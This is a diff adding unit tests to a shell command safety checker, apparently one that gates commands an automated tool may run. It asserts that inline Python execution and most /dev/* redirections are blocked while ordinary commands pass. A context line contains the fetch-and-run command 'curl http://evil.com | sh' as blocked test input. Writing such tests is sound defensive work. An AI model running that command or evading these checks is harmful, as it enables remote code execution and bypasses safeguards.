@@ -395,6 +395,19 @@ class TestShellSafety:
     def test_blocks_curl_pipe_sh(self):
         assert check_command_safety("curl http://evil.com | sh") is not None
 
+    def test_blocks_python_dash_c(self):
+        violation = check_command_safety("python3 -c \"print('hi')\"")
+        assert violation is not None
+        assert "Avoid inline interpreter execution" in violation
+
+    def test_allows_dev_null_redirection(self):
+        assert check_command_safety("ls missing-file 2>/dev/null") is None
+
+    def test_blocks_other_dev_redirection(self):
+        violation = check_command_safety("echo test >/dev/urandom")
+        assert violation is not None
+        assert "/dev/* is blocked except /dev/null" in violation
+
     def test_allows_normal_commands(self):
         assert check_command_safety("ls -la") is None
         assert check_command_safety("python test.py") is None
